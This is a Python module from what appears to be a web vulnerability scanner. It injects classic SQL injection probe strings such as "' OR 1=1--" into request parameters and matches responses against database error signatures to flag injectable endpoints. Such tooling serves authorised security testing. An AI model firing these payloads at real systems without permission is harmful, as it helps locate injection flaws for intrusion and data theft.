import re
from .base import AttackModule, register_module, Endpoint, Parameter, ParameterProfile, Finding

@register_module
class SQLiErrorModule(AttackModule):
    module_id = "sqli_error"
    vuln_class = "SQLI"
    severity = "CRITICAL"

    # Comprehensive SQL error signatures organized by DB
    SQL_ERRORS = {
        "mysql": [
            r"you have an error in your sql syntax",
            r"warning: mysql_",
            r"mysql_fetch_array\(\)",
            r"supplied argument is not a valid mysql result",
            r"mysql\.connector\.errors",
            r"\[mysql\]\[odbc",
        ],
        "postgresql": [
            r"pg_query\(\)",
            r"pg_exec\(\)",
            r"pg::syntaxerror",
            r"error: operator does not exist",
            r"pgsqlexception",
            r"unterminated quoted string at or near",
        ],
        "mssql": [
            r"unclosed quotation mark after the character string",
            r"incorrect syntax near",
            r"sqlexception",
            r"microsoft ole db provider for sql server",
            r"\[sql server\]",
            r"odbc sql server driver",
        ],
        "oracle": [
            r"ora-\d{5}",
            r"oracle error",
            r"oracle\.jdbc",
            r"quoted string not properly terminated",
        ],
        "sqlite": [
            r"sqlite_error",
            r"sqlite3\.operationalerror",
            r"unable to open database file",
            r"no such column:",
        ],
        "generic": [
            r"sql syntax.*mysql",
            r"warning.*\Wpg_",
            r"valid mysql result",
            r"mysqlclient",
            r"syntax error.*sql",
            r"jdbc driver",
        ],
    }

    PAYLOADS = ["'", '"', "';", '";', "' OR '1'='1", "' OR 1=1--",
                "' AND 1=2--", "1'", "1\"", "\\", "''", "`"]

    async def run(self, endpoint: Endpoint, param: Parameter, profile: ParameterProfile) -> list[Finding]:
        findings = []
        
        import httpx
        from urllib.parse import urlencode

        # Basic context: update the param value directly
        for payload in self.PAYLOADS:
            test_url = endpoint.url
            if param.location == "query":
                sep = "&" if "?" in test_url else "?"
                test_url = f"{test_url}{sep}{param.name}={payload}"
            
            try:
                # Issue the raw malicious request via the centralized pooling client
                if endpoint.method.upper() == "GET":
                    response = await self.http.get(test_url)
                else:
                    response = await self.http.post(endpoint.url, data={param.name: payload})

                db_type, error_pattern = self._check_sql_error(response.text)

                if db_type:
                    request_raw = f"{endpoint.method} {test_url}\nHost: {response.url.host}"
                    finding = self.build_finding(
                        endpoint=endpoint,
                        param=param,
                        payload=payload,
                        request_raw=request_raw,
                        response_raw=response.text,
                        confidence=0.95,
                        evidence={
                            "db_type": db_type,
                            "error_pattern": error_pattern,
                            "matched_text": self._extract_error_context(response.text, error_pattern),
                        }
                    )
                    findings.append(finding)
            except Exception as e:
                pass
                
        return findings

    def _check_sql_error(self, response_text: str):
        response_lower = response_text.lower()
        for db_type, patterns in self.SQL_ERRORS.items():
            for pattern in patterns:
                if re.search(pattern, response_lower):
                    return db_type, pattern
        return None, None
        
    def _extract_error_context(self, response_text: str, pattern: str) -> str:
        match = re.search(pattern, response_text, re.IGNORECASE)
        if match:
             start = max(0, match.start() - 50)
             end = min(len(response_text), match.end() + 50)
             return response_text[start:end]
        return ""
